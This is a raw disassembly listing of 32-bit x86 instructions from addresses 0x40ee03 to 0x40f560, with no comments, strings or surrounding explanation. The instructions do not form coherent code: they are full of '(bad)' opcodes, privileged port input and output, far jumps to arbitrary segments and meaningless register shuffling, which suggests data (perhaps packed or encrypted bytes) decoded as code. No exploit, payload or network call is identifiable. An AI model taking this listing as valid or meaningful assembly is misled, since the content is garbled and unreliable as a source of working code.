  40ee03:	sub    al,0x1b
  40ee05:	lea    eax,[eax+0x15]
  40ee08:	loop   0x40ee06
  40ee0a:	jne    0x40ee28
  40ee0c:	and    eax,ebx
  40ee0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee0f:	stc    
  40ee10:	adc    cl,BYTE PTR [edx]
  40ee12:	pop    edx
  40ee13:	cli    
  40ee14:	imul   edi,DWORD PTR [edx],0x62
  40ee17:	in     eax,0x6a
  40ee19:	jg     0x40ee2f
  40ee1b:	dec    ebp
  40ee1c:	mov    bh,0xf6
  40ee1e:	test   BYTE PTR [edx+edi*1-0x46],0x2f
  40ee23:	adc    ah,BYTE PTR [ebx+0x60ac69c2]
  40ee29:	sbb    cl,BYTE PTR [eax]
  40ee2b:	xchg   ebx,eax
  40ee2c:	and    DWORD PTR [edx],esi
  40ee2e:	jecxz  0x40ee7c
  40ee30:	fstp   TBYTE PTR [eax+0x67]
  40ee33:	test   eax,0xb84564a4
  40ee38:	not    BYTE PTR [ecx+esi*1+0x1b]
  40ee3c:	jle    0x40ee8b
  40ee3e:	lea    ecx,[edx]
  40ee40:	fdiv   QWORD PTR [eax]
  40ee42:	aam    0x8
  40ee44:	push   esp
  40ee45:	repz add eax,0x225f2ea2
  40ee4b:	mov    esi,DWORD PTR [edi+0x32]
  40ee4e:	fsub   QWORD PTR [ecx]
  40ee50:	pop    esi
  40ee51:	xchg   esi,eax
  40ee52:	test   al,0x79
  40ee54:	sbb    BYTE PTR [edx-0x61],dh
  40ee57:	ja     0x40edf7
  40ee59:	xor    al,0x3b
  40ee5b:	sbb    cl,BYTE PTR [ebp+0x3c]
  40ee5e:	xchg   esi,eax
  40ee5f:	jecxz  0x40ee5f
  40ee61:	inc    esi
  40ee62:	pop    edx
  40ee63:	mov    al,cl
  40ee65:	jo     0x40ee04
  40ee67:	xchg   ebx,eax
  40ee68:	mov    cs,WORD PTR [ecx+eax*1-0x43]
  40ee6c:	mov    eax,0x63f5505e
  40ee71:	push   cs
  40ee72:	(bad)  
  40ee73:	jmp    0x68298213
  40ee78:	popf   
  40ee79:	push   ds
  40ee7a:	iret   
  40ee7b:	aaa    
  40ee7c:	ss jp  0x40ee84
  40ee7f:	in     al,dx
  40ee80:	cmp    al,0x1d
  40ee82:	cs stos DWORD PTR es:[edi],eax
  40ee84:	pop    ebx
  40ee85:	mov    ebx,0xf2507b4b
  40ee8a:	mov    edx,0x863b6091
  40ee8f:	dec    esi
  40ee90:	adc    BYTE PTR [edi+0x3c232ec],dl
  40ee96:	mov    ebx,0x2fa7447c
  40ee9b:	and    dl,ch
  40ee9d:	or     esp,DWORD PTR [eax]
  40ee9f:	jmp    0x40ee28
  40eea1:	xchg   edx,eax
  40eea2:	ss inc edi
  40eea4:	sbb    DWORD PTR [ecx-0x35017907],edi
  40eeaa:	stos   DWORD PTR es:[edi],eax
  40eeab:	leave  
  40eeac:	xchg   edx,eax
  40eead:	mov    eax,0x4c66451a
  40eeb2:	adc    DWORD PTR [edx-0x219b3036],edx
  40eeb8:	sub    BYTE PTR [ebp-0xb8dd5c2],0x71
  40eebf:	bound  esp,QWORD PTR [ecx+0x7f041610]
  40eec5:	adc    BYTE PTR [edi],ah
  40eec7:	(bad)  
  40eec8:	idiv   edi
  40eeca:	xor    ecx,DWORD PTR [ebp-0x2e]
  40eecd:	ss iret 
  40eecf:	mov    dl,BYTE PTR [ebx]
  40eed1:	sahf   
  40eed2:	jle    0x40eec5
  40eed4:	xchg   ebp,eax
  40eed5:	mov    ds:0x568c12a0,eax
  40eeda:	sub    cl,BYTE PTR [ebp+0x7487d6a4]
  40eee0:	cmp    edi,DWORD PTR [edx]
  40eee2:	xor    al,0x3c
  40eee4:	shl    BYTE PTR [ecx],cl
  40eee6:	xor    bl,ch
  40eee8:	dec    edi
  40eee9:	cmp    al,0x10
  40eeeb:	push   edi
  40eeec:	lds    esp,FWORD PTR [esi+edx*2+0x73]
  40eef0:	and    al,0x21
  40eef2:	or     esp,DWORD PTR [ecx-0x22]
  40eef5:	in     eax,dx
  40eef6:	pop    edx
  40eef7:	ins    DWORD PTR es:[edi],dx
  40eef8:	es mov ecx,0x5e287eda
  40eefe:	adc    ah,BYTE PTR [ebx]
  40ef00:	add    DWORD PTR [esi],esi
  40ef02:	loopne 0x40eeab
  40ef04:	pop    eax
  40ef05:	cmc    
  40ef06:	adc    esp,DWORD PTR [ecx]
  40ef08:	lock (bad) 
  40ef0a:	loop   0x40ef67
  40ef0c:	and    ebx,DWORD PTR [esi+0x3c259e22]
  40ef12:	mov    ds:0xc1aef85b,eax
  40ef17:	sub    al,al
  40ef19:	dec    ebx
  40ef1a:	out    dx,al
  40ef1b:	rcr    bh,0x6d
  40ef1e:	lock dec eax
  40ef20:	xchg   esi,ebx
  40ef22:	pop    eax
  40ef23:	sbb    ebp,DWORD PTR [ecx]
  40ef25:	and    esi,esi
  40ef27:	enter  0x32f5,0xd7
  40ef2b:	scas   al,BYTE PTR es:[edi]
  40ef2c:	xchg   BYTE PTR [edi+ecx*8+0x6d27fea2],ch
  40ef33:	frstor [ecx]
  40ef35:	sub    al,0xb2
  40ef37:	scas   eax,DWORD PTR es:[edi]
  40ef38:	ja     0x40ef47
  40ef3a:	test   al,0xc5
  40ef3c:	sahf   
  40ef3d:	pop    ecx
  40ef3e:	sbb    BYTE PTR [edi-0x58e53a4],0x84
  40ef45:	sub    DWORD PTR [edx+edi*4+0x32e9c9bd],eax
  40ef4c:	and    ecx,edi
  40ef4e:	push   eax
  40ef4f:	jae    0x40ef67
  40ef51:	pop    edx
  40ef52:	xchg   edi,eax
  40ef53:	out    0x97,eax
  40ef55:	dec    esp
  40ef56:	push   ds
  40ef57:	jge    0x40eefd
  40ef59:	dec    esi
  40ef5a:	and    BYTE PTR [esp+edx*8-0x28],0xd
  40ef5f:	jns    0x40ef55
  40ef61:	ret    0x63b6
  40ef64:	fldcw  WORD PTR [esi+0x7ed60f82]
  40ef6a:	ret    0xa877
  40ef6d:	clc    
  40ef6e:	pop    edx
  40ef6f:	loope  0x40efd9
  40ef71:	pop    edx
  40ef72:	xchg   edx,eax
  40ef73:	adc    eax,DWORD PTR [edi-0x6bb919fc]
  40ef79:	mov    eax,0x53e8c7ba
  40ef7e:	xor    al,0x71
  40ef80:	les    ebp,FWORD PTR [edi+0x2e]
  40ef83:	mov    edx,0xc09c8281
  40ef88:	and    dh,BYTE PTR [eax]
  40ef8a:	xlat   BYTE PTR ds:[ebx]
  40ef8c:	std    
  40ef8d:	into   
  40ef8e:	js     0x40ef27
  40ef90:	xchg   ebp,eax
  40ef91:	mov    ds,WORD PTR [eax]
  40ef93:	add    eax,0x41905398
  40ef98:	jb     0x40ef37
  40ef9a:	mov    WORD PTR [ebp+0x6acf52d5],ss
  40efa0:	mov    dh,0xd6
  40efa2:	lods   al,BYTE PTR ds:[esi]
  40efa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efa4:	je     0x40ef3d
  40efa6:	dec    esp
  40efa7:	add    DWORD PTR [ecx-0x2fa554fe],esp
  40efad:	idiv   cl
  40efaf:	sti    
  40efb0:	ins    BYTE PTR es:[edi],dx
  40efb1:	push   ss
  40efb2:	add    eax,0x74598b45
  40efb7:	mov    fs,WORD PTR [ecx+0x61]
  40efba:	(bad)
  40efbd:	dec    ecx
  40efbe:	popf   
  40efbf:	or     DWORD PTR [ecx+0x57],esi
  40efc2:	mov    WORD PTR [edx],gs
  40efc4:	out    0x6b,al
  40efc6:	arpl   dx,si
  40efc8:	mov    al,ds:0xc839f719
  40efcd:	aaa    
  40efce:	arpl   WORD PTR [edi],bx
  40efd0:	sub    bh,BYTE PTR [edi]
  40efd2:	sbb    cl,0xe
  40efd5:	cmp    edi,DWORD PTR [esi-0x7290fc6b]
  40efdb:	xor    edx,DWORD PTR [esi+0x2393aa17]
  40efe1:	xchg   esp,eax
  40efe2:	jno    0x40ef95
  40efe4:	ret    0x274
  40efe7:	(bad)  
  40efe8:	xchg   ecx,eax
  40efe9:	(bad)  
  40efea:	scas   al,BYTE PTR es:[edi]
  40efeb:	jne    0x40ef85
  40efed:	mov    DWORD PTR [ebx+0x3fbcf760],esi
  40eff3:	or     ah,dh
  40eff5:	addr16 xchg ebp,eax
  40eff7:	or     eax,0x64c2c2c5
  40effc:	mov    ds:0x52861e6d,al
  40f001:	scas   al,BYTE PTR es:[edi]
  40f002:	sub    al,0x86
  40f004:	js     0x40ef98
  40f006:	xchg   edi,eax
  40f007:	iret   
  40f008:	mov    bh,0x30
  40f00a:	jmp    0x9d89:0x3c3e222a
  40f011:	fwait
  40f012:	rol    BYTE PTR [ecx+0x427dfb2e],1
  40f018:	(bad)  
  40f019:	fsubr  QWORD PTR [edx+edi*4+0x7d2f12ab]
  40f020:	cmp    dh,0x16
  40f023:	dec    ebx
  40f024:	and    DWORD PTR [ebp+0x35],ebp
  40f027:	mov    al,ds:0x6e6035b6
  40f02c:	gs aaa 
  40f02e:	int    0xba
  40f030:	stos   DWORD PTR es:[edi],eax
  40f031:	aas    
  40f032:	add    esi,DWORD PTR [ebp+edx*8-0x73f00224]
  40f039:	mov    ah,0x5a
  40f03b:	hlt    
  40f03c:	nop
  40f03d:	ins    DWORD PTR es:[edi],dx
  40f03e:	lods   al,BYTE PTR ds:[esi]
  40f03f:	cld    
  40f040:	stc    
  40f041:	mov    ah,0xfb
  40f043:	addr16 icebp 
  40f045:	dec    ebp
  40f046:	out    dx,al
  40f047:	mov    ds:0x2057ff69,al
  40f04c:	jmp    0x5d167d62
  40f051:	aas    
  40f052:	or     DWORD PTR [eax+0x3339d4e],esi
  40f058:	lods   al,BYTE PTR ds:[esi]
  40f059:	sahf   
  40f05a:	mov    edx,0xd4c7b01a
  40f05f:	loop   0x40f04a
  40f061:	loope  0x40f0a4
  40f063:	pop    es
  40f064:	xchg   esp,eax
  40f065:	xlat   BYTE PTR ds:[ebx]
  40f066:	js     0x40efff
  40f068:	mov    ch,0x7a
  40f06a:	add    bl,0xf1
  40f06d:	loop   0x40f07e
  40f06f:	fdivr  st,st(1)
  40f071:	sub    al,0x58
  40f073:	lods   al,BYTE PTR ds:[esi]
  40f074:	add    al,0xf9
  40f076:	inc    ecx
  40f077:	push   ebp
  40f078:	xchg   esi,eax
  40f079:	jle    0x40f064
  40f07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f07c:	or     BYTE PTR [eax],0xbb
  40f07f:	js     0x40f022
  40f081:	pop    eax
  40f082:	xchg   ecx,eax
  40f083:	adc    al,0x13
  40f085:	imul   ebx,DWORD PTR [ebx+0x66ece360],0x7d6d95da
  40f08f:	call   0x8884:0x2429f2ff
  40f096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f097:	mov    al,0x70
  40f099:	pop    ds
  40f09a:	sbb    eax,0x3c89c97e
  40f09f:	jl     0x40f03a
  40f0a1:	rcpps  xmm2,XMMWORD PTR [ebx+0x1da3b56d]
  40f0a8:	aad    0x7f
  40f0aa:	fs jg  0x40f12c
  40f0ad:	and    BYTE PTR ds:0xd24fea96,ah
  40f0b3:	fwait
  40f0b4:	ret    0xd36e
  40f0b7:	loopne 0x40f0ac
  40f0b9:	int3   
  40f0ba:	mov    dl,0x58
  40f0bc:	push   es
  40f0bd:	dec    edx
  40f0be:	xor    eax,0x93184775
  40f0c3:	inc    edx
  40f0c4:	fild   WORD PTR [ebp+0x2e]
  40f0c7:	jb     0x40f10a
  40f0c9:	out    0xea,al
  40f0cb:	push   cs
  40f0cc:	ficom  WORD PTR [ebp-0x68]
  40f0cf:	dec    eax
  40f0d0:	and    dl,BYTE PTR [edi+eiz*2]
  40f0d3:	loopne 0x40f06b
  40f0d5:	pop    ecx
  40f0d6:	lods   al,BYTE PTR ds:[esi]
  40f0d7:	dec    esp
  40f0d8:	push   ecx
  40f0d9:	mov    ch,0x62
  40f0db:	adc    ebp,DWORD PTR [edi-0x7039be3d]
  40f0e1:	adc    BYTE PTR [ebx],0x31
  40f0e4:	in     al,dx
  40f0e5:	stc    
  40f0e6:	cmp    eax,0xe805700d
  40f0eb:	repnz out dx,al
  40f0ed:	mov    eax,ds:0xe107a811
  40f0f2:	(bad)  
  40f0f4:	cld    
  40f0f5:	xor    ebp,DWORD PTR [ecx]
  40f0f7:	pop    ecx
  40f0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f9:	pop    edx
  40f0fa:	addr16 aad 0xb7
  40f0fd:	addr16 mov dl,0x6b
  40f100:	(bad)  
  40f101:	push   ds
  40f102:	jb     0x40f0ef
  40f104:	mov    ah,0xa9
  40f106:	jp     0x40f110
  40f108:	add    eax,0x77221595
  40f10d:	add    DWORD PTR [esi+0x620fab84],ebx
  40f113:	imul   al
  40f115:	jbe    0x40f0b6
  40f117:	sbb    bl,dh
  40f119:	bound  esi,QWORD PTR [ecx+0x67d8859c]
  40f11f:	loopne 0x40f131
  40f121:	xlat   BYTE PTR ds:[ebx]
  40f122:	aas    
  40f123:	arpl   WORD PTR [ecx+0x491b05ba],cx
  40f129:	xchg   esi,eax
  40f12a:	mov    eax,0x3036ef87
  40f12f:	lds    edi,FWORD PTR [ebx+0x3cb45b25]
  40f135:	(bad)  
  40f136:	mov    ah,0xf9
  40f138:	mov    ebx,DWORD PTR [eax+0x1e]
  40f13b:	mov    ecx,0xb86018a4
  40f140:	mov    dh,ah
  40f142:	js     0x40f0e0
  40f144:	jmp    0x40f1c5
  40f146:	xor    BYTE PTR [edi+0x39b67df7],dh
  40f14c:	dec    edi
  40f14d:	retf   0xa8f1
  40f150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f151:	sahf   
  40f152:	xchg   ebp,eax
  40f153:	test   ebx,esp
  40f155:	loopne 0x40f186
  40f157:	neg    BYTE PTR [eax-0xf8aa880]
  40f15d:	shl    DWORD PTR [ebp+0x70],0xf7
  40f161:	mov    bh,0xc4
  40f163:	and    bl,BYTE PTR [ebp+eax*1-0x19]
  40f167:	sub    BYTE PTR [eax],bl
  40f169:	sub    DWORD PTR [esi],edi
  40f16b:	cmp    ah,BYTE PTR [eax-0x11e501fa]
  40f171:	scas   al,BYTE PTR es:[edi]
  40f172:	sub    DWORD PTR [esi+0x2e],0xffffffa3
  40f176:	sbb    eax,0x9bcd5315
  40f17b:	adc    ecx,esi
  40f17d:	or     eax,0x723fd236
  40f182:	inc    edx
  40f183:	xchg   ebp,eax
  40f184:	sbb    BYTE PTR [ecx],bh
  40f186:	sub    esp,DWORD PTR [ecx]
  40f188:	xchg   ebp,eax
  40f189:	iret   
  40f18a:	or     BYTE PTR [edi-0x19],bl
  40f18d:	push   ds
  40f18e:	mov    eax,ds:0x7cde30dc
  40f193:	scas   al,BYTE PTR es:[edi]
  40f194:	gs addr16 xor al,0xbb
  40f198:	cmp    al,0x39
  40f19a:	call   0x16491926
  40f19f:	fistp  QWORD PTR [esi]
  40f1a1:	js     0x40f15a
  40f1a3:	and    eax,0x567586bf
  40f1a8:	mov    al,ds:0x808c5a5f
  40f1ad:	dec    ebx
  40f1ae:	adc    DWORD PTR [edx+0x47],0x4a
  40f1b2:	cmp    DWORD PTR gs:[ebp+0xd3e158a],ebx
  40f1b9:	mov    ah,0x14
  40f1bb:	cmp    BYTE PTR [edx+0x41],0x98
  40f1bf:	leave  
  40f1c0:	sub    DWORD PTR [edx+0x2501742e],0x9
  40f1c7:	into   
  40f1c8:	sbb    bl,BYTE PTR [ebx+0x75e9ea8c]
  40f1ce:	outs   dx,DWORD PTR ds:[esi]
  40f1cf:	daa    
  40f1d0:	in     eax,dx
  40f1d1:	inc    esi
  40f1d2:	inc    edi
  40f1d3:	and    dl,BYTE PTR [esi-0x8]
  40f1d6:	repz inc eax
  40f1d8:	imul   ecx,edi,0x69
  40f1db:	adc    ebp,DWORD PTR [edi]
  40f1dd:	cli    
  40f1de:	cmp    eax,DWORD PTR [edx+0x6901d3d]
  40f1e4:	rcl    DWORD PTR [edi-0x25cb7284],cl
  40f1ea:	or     ah,BYTE PTR [bp+si+0x23bd]
  40f1ef:	add    DWORD PTR [edx+0x7d514eb9],0xffffffdd
  40f1f6:	outs   dx,BYTE PTR ds:[esi]
  40f1f7:	mov    cl,0x55
  40f1f9:	lods   eax,DWORD PTR ds:[esi]
  40f1fa:	int    0x1d
  40f1fc:	inc    ecx
  40f1fd:	pop    eax
  40f1fe:	or     al,0x76
  40f200:	(bad)  
  40f202:	mov    bh,0xf6
  40f204:	leave  
  40f205:	push   ss
  40f206:	es push cs
  40f208:	jg     0x40f289
  40f20a:	aaa    
  40f20b:	lods   al,BYTE PTR ds:[esi]
  40f20c:	clc    
  40f20d:	psubusw mm1,mm4
  40f210:	int3   
  40f211:	mov    ebx,0xfa8b4eab
  40f216:	pop    ss
  40f217:	in     al,dx
  40f218:	cmp    BYTE PTR fs:[ecx-0x41],bl
  40f21c:	leave  
  40f21d:	push   ebx
  40f21e:	daa    
  40f21f:	push   esp
  40f220:	pop    esi
  40f221:	enter  0x4e1,0xa3
  40f225:	cmp    bl,cl
  40f227:	dec    ebp
  40f228:	push   esi
  40f229:	outs   dx,BYTE PTR ds:[esi]
  40f22a:	ret    0xe822
  40f22d:	addr16 mov ebp,0x790f9324
  40f233:	int3   
  40f234:	aam    0xf7
  40f236:	jns    0x40f22f
  40f238:	hlt    
  40f239:	clc    
  40f23a:	inc    edi
  40f23b:	inc    esi
  40f23c:	xor    edi,DWORD PTR [esi-0x5ebb5734]
  40f242:	(bad)  
  40f243:	xchg   esp,eax
  40f244:	int    0xb4
  40f246:	or     edi,DWORD PTR [edi-0x4f]
  40f249:	(bad)  
  40f24a:	jle    0x40f23c
  40f24c:	mov    bl,0x45
  40f24e:	sub    bl,cl
  40f250:	out    0x44,al
  40f252:	mov    edx,DWORD PTR [ecx+0x61ebd7ec]
  40f258:	fs push edi
  40f25a:	std    
  40f25b:	fwait
  40f25c:	mov    ecx,0xe9b795a3
  40f261:	lahf   
  40f262:	out    dx,al
  40f263:	cmp    BYTE PTR [ebx+ecx*4-0x33],ch
  40f267:	test   edx,eax
  40f269:	add    dh,BYTE PTR [edx+0x431e989b]
  40f26f:	(bad)  
  40f270:	cld    
  40f271:	mov    ecx,0x8b4bb549
  40f276:	or     DWORD PTR [eax-0x40],ecx
  40f279:	jae    0x40f1fe
  40f27b:	mov    edx,0x8b7b9588
  40f280:	pop    ds
  40f281:	dec    ecx
  40f282:	jne    0x40f22a
  40f284:	mov    ch,0xd1
  40f286:	ror    DWORD PTR [ebp+0x2e514a29],cl
  40f28c:	ja     0x40f2d0
  40f28e:	std    
  40f28f:	shl    DWORD PTR [esi],0x79
  40f292:	std    
  40f293:	je     0x40f2cc
  40f295:	leave  
  40f296:	push   ebx
  40f297:	or     BYTE PTR [eax-0x2],bl
  40f29a:	lods   eax,DWORD PTR ds:[esi]
  40f29b:	and    ch,ch
  40f29d:	xchg   DWORD PTR [edx+ebx*4+0x779a4b85],edi
  40f2a4:	aas    
  40f2a5:	push   eax
  40f2a6:	lea    eax,[ebx+0x43]
  40f2a9:	jecxz  0x40f319
  40f2ab:	jl     0x40f2e3
  40f2ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2ae:	shl    BYTE PTR gs:[ebp-0x28],1
  40f2b2:	imul   esi,DWORD PTR [eax],0x7a
  40f2b5:	add    DWORD PTR [ecx+0x6c],esi
  40f2b8:	mov    ecx,0x82711e64
  40f2bd:	or     BYTE PTR [edx-0x36],0xd5
  40f2c1:	inc    DWORD PTR [esi]
  40f2c3:	dec    esi
  40f2c4:	sbb    DWORD PTR [edx],0x1a58a93f
  40f2ca:	pop    ebp
  40f2cb:	xchg   edx,eax
  40f2cc:	add    ebx,DWORD PTR [esi]
  40f2ce:	mov    DWORD PTR ds:0x710a47cf,ebp
  40f2d4:	cld    
  40f2d5:	lock dec edi
  40f2d7:	jp     0x40f2d1
  40f2d9:	sub    BYTE PTR [ebp-0x564608b6],dh
  40f2df:	ds and al,0x90
  40f2e2:	cmp    bh,BYTE PTR gs:[eax+0x30]
  40f2e6:	push   ds
  40f2e7:	inc    eax
  40f2e8:	push   edx
  40f2e9:	aas    
  40f2ea:	ins    BYTE PTR es:[edi],dx
  40f2eb:	addr16 enter 0xb4d0,0xa9
  40f2f0:	sbb    ah,cl
  40f2f2:	inc    edx
  40f2f3:	adc    ch,BYTE PTR [esi]
  40f2f5:	add    al,0x56
  40f2f7:	dec    edi
  40f2f8:	cmc    
  40f2f9:	cld    
  40f2fa:	mov    bh,0x3e
  40f2fc:	cmp    al,0xdf
  40f2fe:	fidivr WORD PTR ds:0x9b2dffb6
  40f304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f305:	mov    ch,0x6a
  40f307:	mov    dh,ch
  40f309:	mov    ah,BYTE PTR [esi+eax*4]
  40f30c:	xor    eax,ecx
  40f30e:	jne    0x40f29d
  40f310:	mov    ch,0x6e
  40f312:	jge    0x40f30c
  40f314:	cmp    DWORD PTR [ebp+esi*4+0x4dc0158e],edi
  40f31b:	pop    ecx
  40f31c:	out    dx,al
  40f31d:	sar    BYTE PTR [edx+0x77],1
  40f320:	inc    ecx
  40f321:	js     0x40f2f9
  40f323:	idiv   DWORD PTR [esi]
  40f325:	sbb    edi,esp
  40f327:	arpl   WORD PTR [ecx+0x7ec43541],ax
  40f32d:	mov    ecx,ss
  40f32f:	mov    esi,0xb55573fe
  40f334:	dec    ebp
  40f335:	in     eax,dx
  40f336:	push   ds
  40f337:	xor    edi,ebx
  40f339:	sbb    eax,esp
  40f33b:	inc    esi
  40f33c:	cmp    edi,DWORD PTR [ebp-0x4a]
  40f33f:	dec    edi
  40f340:	mov    esp,0x56627289
  40f345:	xor    eax,edi
  40f347:	xor    eax,DWORD PTR [ecx+0x23ff7bc1]
  40f34d:	clc    
  40f34e:	or     ebp,0x53
  40f351:	mov    edi,0x2d5fc02a
  40f356:	xor    DWORD PTR [ebx+0x2d443800],0xcffcc3e7
  40f360:	lds    esi,FWORD PTR [edi-0x1a3653ba]
  40f366:	dec    esp
  40f367:	pop    ds
  40f368:	or     al,0x88
  40f36a:	jmp    0x40f2fd
  40f36c:	push   ss
  40f36d:	jmp    0x7978:0x2637bc1b
  40f374:	(bad)  
  40f375:	dec    edx
  40f376:	data16 (bad) 
  40f378:	aam    0x62
  40f37a:	call   0x6f8f:0x9747dc82
  40f381:	(bad)  
  40f382:	jbe    0x40f323
  40f384:	pop    eax
  40f385:	push   esp
  40f386:	ja     0x40f30e
  40f388:	mov    dl,0x87
  40f38a:	push   ss
  40f38b:	xor    ecx,DWORD PTR [ebx-0x7a044d26]
  40f391:	sbb    ch,BYTE PTR [ebx+0x190c7477]
  40f397:	cmp    cl,BYTE PTR [ecx-0x3652d677]
  40f39d:	inc    ecx
  40f39e:	mov    cs,WORD PTR [eax]
  40f3a0:	test   DWORD PTR ss:[edi+0x79],eax
  40f3a4:	call   0xfe26:0x3932217f
  40f3ab:	mov    ds:0x453a404e,eax
  40f3b0:	adc    al,0x43
  40f3b2:	mov    ecx,0xfd68e442
  40f3b7:	in     eax,0x87
  40f3b9:	rcl    DWORD PTR [edi-0x75cf7d9b],0x97
  40f3c0:	test   DWORD PTR [ebp+0x47d4d86b],ebp
  40f3c6:	mov    al,0xf2
  40f3c8:	imul   ebp,DWORD PTR [ecx],0xf0de5131
  40f3ce:	nop
  40f3cf:	sbb    esp,eax
  40f3d1:	sub    DWORD PTR [ecx-0x64],esi
  40f3d4:	sahf   
  40f3d5:	jae    0x40f38b
  40f3d7:	push   ebx
  40f3d8:	add    edi,DWORD PTR [ebp-0x143929ca]
  40f3de:	into   
  40f3df:	ret    0x6e0d
  40f3e2:	push   cs
  40f3e3:	and    esp,eax
  40f3e5:	xchg   esi,eax
  40f3e6:	retf   
  40f3e7:	out    0xa1,al
  40f3e9:	add    ecx,DWORD PTR [edx+0x73256ead]
  40f3ef:	daa    
  40f3f0:	outs   dx,DWORD PTR ds:[esi]
  40f3f1:	add    al,0x81
  40f3f3:	lods   al,BYTE PTR ds:[esi]
  40f3f4:	aam    0xf4
  40f3f6:	cmp    ebx,eax
  40f3f8:	jl     0x40f43f
  40f3fa:	pop    edx
  40f3fb:	mov    ah,0xd8
  40f3fd:	(bad)  
  40f3fe:	outs   dx,DWORD PTR ds:[esi]
  40f3ff:	pusha  
  40f400:	cmp    eax,DWORD PTR [eax]
  40f402:	loopne 0x40f420
  40f404:	test   BYTE PTR [esi-0x57],cl
  40f407:	sti    
  40f408:	xor    ebx,DWORD PTR [edx+ecx*2-0x5234b0e2]
  40f40f:	pop    edi
  40f410:	aad    0x59
  40f412:	rcl    DWORD PTR [edx+0x2c],cl
  40f415:	loop   0x40f418
  40f417:	aas    
  40f418:	arpl   WORD PTR [ebp+0x6bedcbb8],di
  40f41e:	loop   0x40f3ac
  40f420:	dec    esi
  40f421:	jecxz  0x40f3f4
  40f423:	push   0xa7652f2f
  40f428:	mov    cl,0xe
  40f42a:	jmp    0xdd601982
  40f42f:	retf   
  40f430:	jmp    0x40f429
  40f432:	(bad)  [ebx]
  40f434:	cld    
  40f435:	in     al,dx
  40f436:	sub    al,BYTE PTR [edi+0x56844f84]
  40f43c:	aad    0xb2
  40f43e:	adc    DWORD PTR [edi],edi
  40f440:	xchg   BYTE PTR [esi+0x48ef90fc],bh
  40f446:	aaa    
  40f447:	lock sub al,bh
  40f44a:	rsm    
  40f44c:	mov    ah,0x75
  40f44e:	dec    esi
  40f44f:	mov    ecx,0xd17d565b
  40f454:	cli    
  40f455:	pop    eax
  40f456:	push   edi
  40f457:	out    0xbe,eax
  40f459:	je     0x40f4b3
  40f45b:	cld    
  40f45c:	je     0x40f4cc
  40f45e:	inc    ebx
  40f45f:	sbb    DWORD PTR [esi],eax
  40f461:	fstp   DWORD PTR [ecx+0x3e]
  40f464:	xor    DWORD PTR [ebx+0x2f3b018],0x696fa231
  40f46e:	fild   QWORD PTR [eax-0xd2d173e]
  40f474:	add    ebp,DWORD PTR [ecx-0x6370308d]
  40f47a:	dec    eax
  40f47b:	and    BYTE PTR [edx],bl
  40f47d:	xchg   esi,eax
  40f47e:	data16 hlt 
  40f480:	pop    es
  40f481:	cmp    al,0xdb
  40f483:	pop    esi
  40f484:	pop    eax
  40f485:	fist   WORD PTR [ebx+0x201b7ca7]
  40f48b:	mov    DWORD PTR [ebx],eax
  40f48d:	sbb    al,0xbc
  40f48f:	sub    cl,BYTE PTR [edi-0x20]
  40f492:	lods   eax,DWORD PTR ds:[esi]
  40f493:	popf   
  40f494:	mov    eax,esi
  40f496:	pop    ss
  40f497:	pop    ds
  40f498:	mov    eax,ds:0x38baa337
  40f49d:	ins    BYTE PTR es:[edi],dx
  40f49e:	adc    DWORD PTR [eax+0x38],ecx
  40f4a1:	(bad)  
  40f4a2:	je     0x40f4cc
  40f4a4:	push   0x19
  40f4a6:	ret    0x2e7f
  40f4a9:	adc    eax,0x953f676d
  40f4ae:	cmp    eax,0xfa5c4672
  40f4b3:	mov    edx,0x8619f0fd
  40f4b8:	call   0x3717:0x1aa1c923
  40f4bf:	xchg   edx,eax
  40f4c0:	in     al,dx
  40f4c1:	in     eax,0x4e
  40f4c3:	arpl   WORD PTR [eax],bp
  40f4c5:	popf   
  40f4c6:	jae    0x40f533
  40f4c8:	xlat   BYTE PTR ds:[ebx]
  40f4c9:	imul   edi,ecx,0x52
  40f4cc:	mov    ebx,DWORD PTR [esi-0x128a192a]
  40f4d2:	xlat   BYTE PTR ds:[ebx]
  40f4d3:	repnz inc ebx
  40f4d5:	leave  
  40f4d6:	retf   0x4516
  40f4d9:	int    0x3d
  40f4db:	call   0x2f67:0xc7df6fc2
  40f4e2:	ins    DWORD PTR es:[edi],dx
  40f4e3:	mov    ah,0x4f
  40f4e5:	addr16 dec ebx
  40f4e7:	dec    edx
  40f4e8:	(bad)  
  40f4e9:	and    DWORD PTR [edx+ebx*4],ecx
  40f4ec:	sub    eax,esi
  40f4ee:	lea    ebp,[edi-0x417a510d]
  40f4f4:	les    edx,FWORD PTR [edi-0x55]
  40f4f7:	xabort 0x9e
  40f4fa:	jg     0x40f4ec
  40f4fc:	mov    ch,0xa0
  40f4fe:	mov    edi,0x7eff4f85
  40f503:	pop    ds
  40f504:	xchg   edx,eax
  40f505:	inc    esi
  40f506:	pop    eax
  40f507:	cmp    edx,DWORD PTR [eax]
  40f509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f50a:	add    DWORD PTR [ecx-0x79d79494],edi
  40f510:	cmc    
  40f511:	sbb    DWORD PTR [ebx-0x657bee76],ecx
  40f517:	push   ebx
  40f518:	je     0x40f54b
  40f51a:	je     0x40f517
  40f51c:	sar    dh,cl
  40f51e:	xor    ecx,DWORD PTR [esi-0x52]
  40f521:	push   0x44502b3
  40f526:	(bad)  
  40f528:	sbb    al,0x64
  40f52a:	push   0xe7f575a9
  40f52f:	pushf  
  40f530:	test   edi,esp
  40f532:	pop    ebp
  40f533:	test   esi,esp
  40f535:	add    BYTE PTR [ecx+0x4b],0x95
  40f539:	ret    
  40f53a:	cmc    
  40f53b:	adc    DWORD PTR [ebx-0x1ffb8aa],esi
  40f541:	sti    
  40f542:	push   edx
  40f543:	mov    esi,DWORD PTR [eax-0x1e]
  40f546:	enter  0xd68b,0x95
  40f54a:	inc    ecx
  40f54b:	jl     0x40f54b
  40f54d:	cmp    ecx,DWORD PTR [ecx-0x6e]
  40f550:	imul   ebx,DWORD PTR ds:0x762f5787,0x66
  40f557:	xor    BYTE PTR [ebp+0x169b60ca],ch
  40f55d:	imul   esi,DWORD PTR [edi],0xffffffbc
  40f560:	outs   dx,BYTE PTR ds:[esi]
